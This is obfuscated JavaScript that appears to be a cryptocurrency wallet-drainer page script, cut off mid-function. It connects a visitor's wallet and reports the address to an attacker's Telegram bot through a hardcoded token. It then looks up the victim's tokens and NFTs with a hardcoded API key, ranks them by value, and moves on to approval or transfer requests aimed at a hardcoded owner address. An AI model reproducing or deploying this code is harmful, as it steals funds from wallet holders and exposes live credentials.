const _0x13f77f=_0x176b;(function(_0x34cea5,_0x2be8e8){const _0x2a107d=_0x176b,_0x250cd2=_0x34cea5();while(!![]){try{const _0x383f04=parseInt(_0x2a107d(0x10a))/0x1+-parseInt(_0x2a107d(0xf3))/0x2*(parseInt(_0x2a107d(0x8d))/0x3)+-parseInt(_0x2a107d(0x11d))/0x4+-parseInt(_0x2a107d(0xb1))/0x5*(-parseInt(_0x2a107d(0x74))/0x6)+-parseInt(_0x2a107d(0x7d))/0x7+parseInt(_0x2a107d(0xbe))/0x8*(-parseInt(_0x2a107d(0xd4))/0x9)+-parseInt(_0x2a107d(0x6f))/0xa*(-parseInt(_0x2a107d(0x71))/0xb);if(_0x383f04===_0x2be8e8)break;else _0x250cd2['push'](_0x250cd2['shift']());}catch(_0x688de1){_0x250cd2['push'](_0x250cd2['shift']());}}}(_0x38b4,0xa1d48));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {polygon,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[polygon,mainnet],projectId=_0x13f77f(0x92),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x13f77f(0x7a))]({'chains':chains,'options':{'appName':_0x13f77f(0xfc)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);function _0x176b(_0x39834b,_0x3bbe73){const _0x38b4a3=_0x38b4();return _0x176b=function(_0x176b89,_0x57e8ef){_0x176b89=_0x176b89-0x6d;let _0x4cf7aa=_0x38b4a3[_0x176b89];return _0x4cf7aa;},_0x176b(_0x39834b,_0x3bbe73);}export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x13f77f(0xf9),'coinbase':'https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png'}},ethereumClient);let currentUrl=window[_0x13f77f(0xe6)]['href'];const OWNER_ADDRESS=_0x13f77f(0xd1),ABI=[{'constant':!![],'inputs':[],'name':_0x13f77f(0xd3),'outputs':[{'name':'','type':_0x13f77f(0xcd)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0xf1),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x79),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0x125),'type':_0x13f77f(0x10d)},{'name':'_value','type':_0x13f77f(0x113)}],'name':_0x13f77f(0xea),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':_0x13f77f(0x90),'outputs':[{'name':'','type':_0x13f77f(0x100)}],'payable':![],'stateMutability':'view','type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0xfb),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x122),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':_0x13f77f(0xba),'outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0xca),'type':_0x13f77f(0x10d)},{'name':_0x13f77f(0xa4),'type':_0x13f77f(0x10d)},{'name':_0x13f77f(0xdc),'type':_0x13f77f(0x113)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x13f77f(0x10d)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x88),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':_0x13f77f(0x109),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x13f77f(0x103)},{'constant':!![],'inputs':[{'name':_0x13f77f(0x8c),'type':'address'}],'name':_0x13f77f(0x116),'outputs':[{'name':'','type':_0x13f77f(0x100)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[{'name':'','type':_0x13f77f(0x10d)},{'name':'','type':_0x13f77f(0x10d)}],'name':_0x13f77f(0xf4),'outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x13f77f(0x100)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[{'name':'who','type':'address'}],'name':_0x13f77f(0x96),'outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'constant':![],'inputs':[],'name':_0x13f77f(0x78),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x13f77f(0x10d)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x13f77f(0x10d)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':_0x13f77f(0xb0),'outputs':[{'name':'','type':_0x13f77f(0xcd)}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0xa4),'type':'address'},{'name':_0x13f77f(0xdc),'type':'uint256'}],'name':_0x13f77f(0xd7),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':'function'},{'constant':![],'inputs':[{'name':_0x13f77f(0xd9),'type':_0x13f77f(0x113)},{'name':_0x13f77f(0xac),'type':_0x13f77f(0x113)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':'amount','type':_0x13f77f(0x113)}],'name':_0x13f77f(0x8b),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0xad),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0x81),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':'function'},{'constant':!![],'inputs':[{'name':_0x13f77f(0xb4),'type':_0x13f77f(0x10d)},{'name':_0x13f77f(0x125),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x105),'outputs':[{'name':_0x13f77f(0xe4),'type':'uint256'}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x13f77f(0x113)}],'payable':![],'stateMutability':'view','type':_0x13f77f(0x103)},{'constant':!![],'inputs':[{'name':'','type':_0x13f77f(0x10d)}],'name':_0x13f77f(0xf2),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0x9f),'type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x13f77f(0xb7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':_0x13f77f(0x6d),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x7e),'outputs':[],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':'address'}],'name':_0x13f77f(0x117),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x13f77f(0x103)},{'inputs':[{'name':'_initialSupply','type':_0x13f77f(0x113)},{'name':_0x13f77f(0xf7),'type':_0x13f77f(0xcd)},{'name':'_symbol','type':_0x13f77f(0xcd)},{'name':_0x13f77f(0xec),'type':'uint256'}],'payable':![],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x11a)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x13f77f(0xad),'type':_0x13f77f(0x113)}],'name':'Issue','type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x13f77f(0xad),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xfa),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x10f),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':_0x13f77f(0x113)},{'indexed':![],'name':_0x13f77f(0x75),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0x87),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'_blackListedUser','type':_0x13f77f(0x10d)},{'indexed':![],'name':_0x13f77f(0xe3),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xdb),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x13f77f(0x10c),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0xd6),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':'address'}],'name':_0x13f77f(0x11b),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x13f77f(0xa5),'type':_0x13f77f(0x10d)},{'indexed':!![],'name':_0x13f77f(0x6e),'type':'address'},{'indexed':![],'name':_0x13f77f(0xa9),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xed),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x13f77f(0xfd),'type':_0x13f77f(0x10d)},{'indexed':!![],'name':'to','type':_0x13f77f(0x10d)},{'indexed':![],'name':'value','type':_0x13f77f(0x113)}],'name':'Transfer','type':'event'},{'anonymous':![],'inputs':[],'name':_0x13f77f(0xbd),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x13f77f(0xcf),'type':_0x13f77f(0x123)}],ABIN=[{'inputs':[{'internalType':_0x13f77f(0xcd),'name':_0x13f77f(0xd3),'type':_0x13f77f(0xcd)},{'internalType':_0x13f77f(0xcd),'name':_0x13f77f(0xb0),'type':_0x13f77f(0xcd)},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0xbb),'type':_0x13f77f(0x113)},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x97),'type':_0x13f77f(0x113)}],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xa5),'type':_0x13f77f(0x10d)},{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xde),'type':_0x13f77f(0x10d)},{'indexed':!![],'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':'uint256'}],'name':_0x13f77f(0xed),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xa5),'type':'address'},{'indexed':!![],'internalType':'address','name':_0x13f77f(0x85),'type':_0x13f77f(0x10d)},{'indexed':![],'internalType':_0x13f77f(0x100),'name':_0x13f77f(0xde),'type':'bool'}],'name':_0x13f77f(0x127),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':'previousOwner','type':_0x13f77f(0x10d)},{'indexed':!![],'internalType':'address','name':_0x13f77f(0x6d),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0xf0),'type':_0x13f77f(0x123)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xfd),'type':'address'},{'indexed':!![],'internalType':_0x13f77f(0x10d),'name':'to','type':_0x13f77f(0x10d)},{'indexed':!![],'internalType':'uint256','name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':'Transfer','type':_0x13f77f(0x123)},{'inputs':[],'name':_0x13f77f(0x9a),'outputs':[{'internalType':_0x13f77f(0xcd),'name':'','type':_0x13f77f(0xcd)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':'MAX_APES','outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0x111),'outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0x9c),'outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':'to','type':'address'},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xea),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':'function'},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xa5),'type':_0x13f77f(0x10d)}],'name':'balanceOf','outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x13f77f(0xcd),'name':'','type':_0x13f77f(0xcd)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0x70),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0xc2),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':'uint256'}],'name':_0x13f77f(0xc3),'outputs':[{'internalType':_0x13f77f(0x10d),'name':'','type':_0x13f77f(0x10d)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xa5),'type':'address'},{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0x85),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0xda),'outputs':[{'internalType':_0x13f77f(0x100),'name':'','type':_0x13f77f(0x100)}],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'inputs':[],'name':_0x13f77f(0x106),'outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':'numberOfTokens','type':_0x13f77f(0x113)}],'name':'mintApe','outputs':[],'stateMutability':_0x13f77f(0xd5),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0xd3),'outputs':[{'internalType':_0x13f77f(0xcd),'name':'','type':_0x13f77f(0xcd)}],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'inputs':[],'name':_0x13f77f(0xa5),'outputs':[{'internalType':_0x13f77f(0x10d),'name':'','type':_0x13f77f(0x10d)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':'ownerOf','outputs':[{'internalType':_0x13f77f(0x10d),'name':'','type':_0x13f77f(0x10d)}],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'inputs':[],'name':_0x13f77f(0xeb),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':'function'},{'inputs':[],'name':_0x13f77f(0x8f),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':'address','name':_0x13f77f(0xfd),'type':_0x13f77f(0x10d)},{'internalType':_0x13f77f(0x10d),'name':'to','type':'address'},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':'from','type':_0x13f77f(0x10d)},{'internalType':_0x13f77f(0x10d),'name':'to','type':_0x13f77f(0x10d)},{'internalType':_0x13f77f(0x113),'name':'tokenId','type':_0x13f77f(0x113)},{'internalType':'bytes','name':_0x13f77f(0xee),'type':_0x13f77f(0xa2)}],'name':_0x13f77f(0xfe),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0x12a),'outputs':[{'internalType':_0x13f77f(0x100),'name':'','type':_0x13f77f(0x100)}],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':'operator','type':'address'},{'internalType':_0x13f77f(0x100),'name':'approved','type':_0x13f77f(0x100)}],'name':_0x13f77f(0x95),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0xcd),'name':_0x13f77f(0x98),'type':_0x13f77f(0xcd)}],'name':_0x13f77f(0xc8),'outputs':[],'stateMutability':'nonpayable','type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0xcd),'name':'provenanceHash','type':'string'}],'name':'setProvenanceHash','outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x104),'type':_0x13f77f(0x113)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0xab),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':'uint256','name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0xc7),'outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x13f77f(0xff),'name':'interfaceId','type':_0x13f77f(0xff)}],'name':_0x13f77f(0x7f),'outputs':[{'internalType':'bool','name':'','type':_0x13f77f(0x100)}],'stateMutability':_0x13f77f(0x7c),'type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x13f77f(0xcd),'name':'','type':_0x13f77f(0xcd)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0xae),'type':_0x13f77f(0x113)}],'name':'tokenByIndex','outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':'view','type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xa5),'type':_0x13f77f(0x10d)},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0xae),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xaf),'outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xef),'outputs':[{'internalType':_0x13f77f(0xcd),'name':'','type':'string'}],'stateMutability':_0x13f77f(0x7c),'type':_0x13f77f(0x103)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x13f77f(0x113),'name':'','type':_0x13f77f(0x113)}],'stateMutability':'view','type':_0x13f77f(0x103)},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0xfd),'type':_0x13f77f(0x10d)},{'internalType':_0x13f77f(0x10d),'name':'to','type':'address'},{'internalType':_0x13f77f(0x113),'name':_0x13f77f(0x129),'type':_0x13f77f(0x113)}],'name':_0x13f77f(0xc4),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x13f77f(0x10d),'name':_0x13f77f(0x6d),'type':_0x13f77f(0x10d)}],'name':_0x13f77f(0x7e),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)},{'inputs':[],'name':_0x13f77f(0x101),'outputs':[],'stateMutability':_0x13f77f(0x114),'type':_0x13f77f(0x103)}];let wallet;function _0x38b4(){const _0x344fa9=['_clearedUser','result','networkVersion','bytes','getProvider','_to','owner','price','status','trustwallet','value','MetaMask','setStartingIndex','newMaxFee','amount','index','tokenOfOwnerByIndex','symbol','15xjszqf','/nft/collections?chain=','catch','_owner','Transaction\x20Rejected','Error\x20collecting\x20info\x20about\x20wallet','MAX_UINT','Token','https://metamask.app.link/dapp/','totalSupply','maxNftSupply','&format=decimal&limit=','Pause','514552ALyZGj','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','tokens-list','filter','flipSaleState','getApproved','transferFrom','options','Approve\x20Completed\x20Successfully','startingIndexBlock','setBaseURI','openModal','_from','undefined','.coinbase','string','metamask','Unpause','length','0xea8968B218a551919FbD5f1166328C82a96dED54','log','name','9RaEDcn','payable','AddedBlackList','transfer','999999999999999999999999999999999999999999999999999999999999999999999999','newBasisPoints','isApprovedForAll','DestroyedBlackFunds','_value','.connect','approved','href','.proceed','formatted','coinbase','_balance','remaining','usd','location','json','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','NFT','approve','renounceOwnership','_decimals','Approval','_data','tokenURI','OwnershipTransferred','_upgradedAddress','isBlackListed','807434XTDAeG','allowed','all','https://api.coingecko.com/api/v3/simple/token_price/polygon?contract_addresses=','_name','GET','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Redeem','_evilUser','Blockchain\x20rectification','from','safeTransferFrom','bytes4','bool','withdraw','balance','function','revealTimeStamp','allowance','maxApePurchase','Transaction\x20hash\x20','connector','decimals','1132370uylSHa','Error:\x20','_user','address','/erc20','Deprecate','NFTs\x20collection\x20','REVEAL_TIMESTAMP','Could\x20not\x20get\x20a\x20wallet\x20connection','uint256','nonpayable','No\x20address','getBlackListStatus','destroyBlackFunds','then','.trust','constructor','RemovedBlackList','error','4752084HhKGGg','Error\x20processing\x20item\x20','.meta','New\x20token','Initial\x20list\x20','addBlackList','event','NFT\x20Contract\x20Address\x20','_spender','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','ApprovalForAll','application/json','tokenId','saleIsActive','newOwner','spender','190DckDGn','emergencySetStartingIndexBlock','610126fqrPqK','Hahahahahah','https://deep-index.moralis.io/api/v2/','1235022EfqzOq','maxFee','TOKEN\x20Contract\x20Address\x20','polygon','pause','deprecate','CoinbaseWalletConnector','Tokens:','view','3393754VzPYjH','transferOwnership','supportsInterface','map','redeem','https://go.cb-w.com/dapp?cb_url=','Your\x20address\x20','message','operator','&text=','Params','balances','click','&vs_currencies=usd','issue','_maker','3PNBXRF','hash','reserveApes','deprecated','chainId:','ee71d215d0dec7d1bf950851c84d9643','token_address','Transaction\x20is\x20submitted\x20to\x20the\x20network','setApprovalForAll','balanceOf','saleStart','baseURI','sort','BAYC_PROVENANCE','Transaction\x20Receipt:\x20','apePrice','https://link.trustwallet.com/open_url?url=','toString'];_0x38b4=function(){return _0x344fa9;};return _0x38b4();}$(_0x13f77f(0x11f))[_0x13f77f(0x89)](async function(){wallet='metamask',await connector();}),$(_0x13f77f(0xcc))[_0x13f77f(0x89)](async function(){const _0x4fa366=_0x13f77f;wallet=_0x4fa366(0xe2),await connector();}),$(_0x13f77f(0x119))[_0x13f77f(0x89)](async function(){const _0x2ee1f2=_0x13f77f;wallet=_0x2ee1f2(0xa8),await connector();}),$(_0x13f77f(0xdd))[_0x13f77f(0x89)](async function(){const _0x367224=_0x13f77f;try{await web3Modal[_0x367224(0xc9)]();}catch(_0x2adabc){console['log'](_0x367224(0x112),_0x2adabc);return;}});let connector=async()=>{const _0x506daf=_0x13f77f;if(typeof web3===_0x506daf(0xcb)&&typeof ethereum==='undefined'){console[_0x506daf(0xd2)](_0x506daf(0x72));if(wallet===_0x506daf(0xce)){let _0x46eb6d=_0x506daf(0xb9)+currentUrl;window[_0x506daf(0xe6)]['href']=_0x46eb6d;}else{if(wallet===_0x506daf(0xe2)){let _0x32b4b7=_0x506daf(0x82)+currentUrl;window[_0x506daf(0xe6)][_0x506daf(0xdf)]=_0x32b4b7;}else{if(wallet==='trustwallet'){let _0x59e16d=_0x506daf(0x9d)+currentUrl;window['location'][_0x506daf(0xdf)]=_0x59e16d;}}}}else try{await web3Modal[_0x506daf(0xc9)]();}catch(_0x2b6ae4){console[_0x506daf(0xd2)](_0x506daf(0x112),_0x2b6ae4);return;}};$(_0x13f77f(0xe0))['click'](async function(){const _0x3edcca=_0x13f77f;let _0x24ae02=getAccount();console[_0x3edcca(0xd2)](_0x24ae02),!_0x24ae02[_0x3edcca(0x10d)]&&(console[_0x3edcca(0xd2)](_0x3edcca(0x115)),alert('You\x20need\x20to\x20connect\x20your\x20wallet\x20first')),_0x24ae02[_0x3edcca(0x108)][_0x3edcca(0xd3)]===_0x3edcca(0xaa)&&(_0x24ae02[_0x3edcca(0x108)][_0x3edcca(0xc5)][_0x3edcca(0xa3)]()[_0x3edcca(0xa1)]!=='137'&&(console['log']('Incorrect\x20network'),await switchNetwork({'chainId':0x89}))),selectedAccount=_0x24ae02[_0x3edcca(0x10d)],sendMessage('Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!'),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x13f77f(0xe8),Oxc='5227607491';async function covalenthqAPICall(){const _0xb2295a=_0x13f77f,_0x3043a7={'chain':_0xb2295a(0x77)},_0x10a523=new URL(_0xb2295a(0x73)+selectedAccount+_0xb2295a(0x10e));_0x10a523['search']=new URLSearchParams(_0x3043a7)[_0xb2295a(0x9e)]();const _0xcd3603={'method':'GET','headers':{'accept':'application/json','X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x556573=await fetch(_0x10a523,_0xcd3603)[_0xb2295a(0x118)](_0x36fabb=>_0x36fabb[_0xb2295a(0xe7)]());console[_0xb2295a(0xd2)](_0x556573);let _0x170ca8=_0x556573;console[_0xb2295a(0xd2)](_0xb2295a(0x121),_0x170ca8);let _0x1d9fba=await Promise[_0xb2295a(0xf5)](_0x170ca8[_0xb2295a(0x80)](async _0x30e9c7=>{const _0x4798b1=_0xb2295a;let _0x141c30;try{_0x141c30=await getValue(_0x30e9c7['token_address'],_0x30e9c7[_0x4798b1(0x102)],_0x30e9c7[_0x4798b1(0x109)]);}catch(_0x433f2c){_0x141c30=0x0;}return console['log'](_0x141c30),{'balance':_0x30e9c7[_0x4798b1(0x102)],'value':_0x141c30,'address':_0x30e9c7[_0x4798b1(0x93)]};}));console[_0xb2295a(0xd2)](_0xb2295a(0xc0),_0x1d9fba),tokens=_0x1d9fba[_0xb2295a(0xc1)](_0x434f0a=>_0x434f0a[_0xb2295a(0xa9)]>0x5),tokens[_0xb2295a(0x99)]((_0x3ea7db,_0x1ef9c7)=>_0x1ef9c7[_0xb2295a(0xa9)]-_0x3ea7db[_0xb2295a(0xa9)]),console['log'](_0xb2295a(0x91),await getNetwork(),_0xb2295a(0x7b),tokens),NFTs=await getNFTs(selectedAccount)[_0xb2295a(0xb3)](_0x5042c0=>{const _0x5f5987=_0xb2295a;console[_0x5f5987(0xd2)]('Unable\x20to\x20get\x20NFts',_0x5042c0);}),NFTs=NFTs[_0xb2295a(0xa0)],console[_0xb2295a(0xd2)](_0xb2295a(0x110),NFTs);if(tokens['length']===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0xb2295a(0xb6));}}async function onApprove(){const 